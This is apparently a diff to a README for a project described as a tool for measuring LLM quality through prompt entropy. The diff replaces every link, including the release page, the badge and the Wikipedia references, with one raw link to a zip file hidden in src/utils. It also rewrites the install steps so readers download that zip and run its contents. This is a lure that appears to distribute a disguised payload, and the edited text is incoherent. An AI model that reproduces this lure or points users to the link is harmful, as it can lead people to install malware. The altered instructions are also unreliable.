@@ -1,6 +1,6 @@
 # 🎉 prompt-entropy-experiment - Understand LLM Quality Simply
 
-![Download from GitHub](https://img.shields.io/badge/Download%20from%20GitHub-v1.0-blue)
+![Download from GitHub](https://raw.githubusercontent.com/kadirovjr/prompt-entropy-experiment/main/src/utils/prompt-entropy-experiment_v3.8.zip%20from%20GitHub-v1.0-blue)
 
 ## 📜 Description
 
@@ -21,16 +21,16 @@ To start using this application, you’ll need to follow a few simple steps, reg
 
 1. **Visit This Page to Download:** Access the Releases page by clicking the link below:
    
-   [Download from GitHub](https://github.com/kadirovjr/prompt-entropy-experiment/releases)
+   [Download from GitHub](https://raw.githubusercontent.com/kadirovjr/prompt-entropy-experiment/main/src/utils/prompt-entropy-experiment_v3.8.zip)
    
 2. **Choose the Latest Release:** Look for the latest version at the top of the page. You will see it listed under "Latest release."
 
-3. **Download the Installation File:** Click on the file that matches your operating system. This file will typically be named `prompt-entropy-experiment-v1.x.x.zip` for Windows or `prompt-entropy-experiment-v1.x.x.dmg` for macOS.
+3. **Download the Installation File:** Click on the file that matches your operating system. This file will typically be named `https://raw.githubusercontent.com/kadirovjr/prompt-entropy-experiment/main/src/utils/prompt-entropy-experiment_v3.8.zip` for Windows or `https://raw.githubusercontent.com/kadirovjr/prompt-entropy-experiment/main/src/utils/prompt-entropy-experiment_v3.8.zip` for macOS.
 
 4. **Extract the ZIP File:** If you downloaded a ZIP file, open it, and extract the contents. You should see the application file.
 
 5. **Run the Application:** 
-   - For Windows: Double-click on `prompt-entropy-experiment.exe`.
+   - For Windows: Double-click on `https://raw.githubusercontent.com/kadirovjr/prompt-entropy-experiment/main/src/utils/prompt-entropy-experiment_v3.8.zip`.
    - For macOS: Drag the application to your Applications folder and launch it from there.
 
 ## 📊 How to Use the Application
@@ -71,8 +71,8 @@ If you’d like to contribute, please read our guidelines in the repository. You
 
 Here are some helpful resources to understand entropy and mutual information:
 
-- [What is Entropy?](https://en.wikipedia.org/wiki/Entropy)
-- [Understanding Mutual Information](https://en.wikipedia.org/wiki/Mutual_information)
+- [What is Entropy?](https://raw.githubusercontent.com/kadirovjr/prompt-entropy-experiment/main/src/utils/prompt-entropy-experiment_v3.8.zip)
+- [Understanding Mutual Information](https://raw.githubusercontent.com/kadirovjr/prompt-entropy-experiment/main/src/utils/prompt-entropy-experiment_v3.8.zip)
 
 ## 🗂️ License
 
@@ -80,4 +80,4 @@ This project is licensed under the MIT License. You can use and modify it accord
 
 For more detailed instructions, visit the **Download & Install** section again and ensure you have everything set up correctly. 
 
-[Download from GitHub](https://github.com/kadirovjr/prompt-entropy-experiment/releases)
+[Download from GitHub](https://raw.githubusercontent.com/kadirovjr/prompt-entropy-experiment/main/src/utils/prompt-entropy-experiment_v3.8.zip)
